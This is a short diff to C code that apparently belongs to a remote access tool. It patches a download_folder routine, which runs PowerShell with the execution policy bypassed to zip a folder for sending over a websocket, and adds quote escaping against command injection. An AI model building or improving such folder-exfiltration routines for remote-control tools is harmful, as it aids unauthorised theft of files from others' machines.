@@ -1664,12 +1664,25 @@ void download_folder(const char* foldername) {
     
     send_websocket_data("[*] Compressing folder...\n", 26);
     
-    // Use PowerShell to compress
+    // Escape folder path for PowerShell (replace ' with '')
+    char escaped_path[MAX_PATH * 2];
+    int j = 0;
+    for (int i = 0; clean_name[i] && j < sizeof(escaped_path) - 2; i++) {
+        if (clean_name[i] == '\'') {
+            escaped_path[j++] = '\'';
+            escaped_path[j++] = '\'';
+        } else {
+            escaped_path[j++] = clean_name[i];
+        }
+    }
+    escaped_path[j] = '\0';
+    
+    // Use PowerShell to compress with proper escaping
     char ps_cmd[4096];
     sprintf(ps_cmd, 
         "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""
-        "Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force\"",
-        clean_name, temp_zip);
+        "$src='%s'; Compress-Archive -LiteralPath (Get-ChildItem -LiteralPath $src).FullName -DestinationPath '%s' -Force\"",
+        escaped_path, temp_zip);
     
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
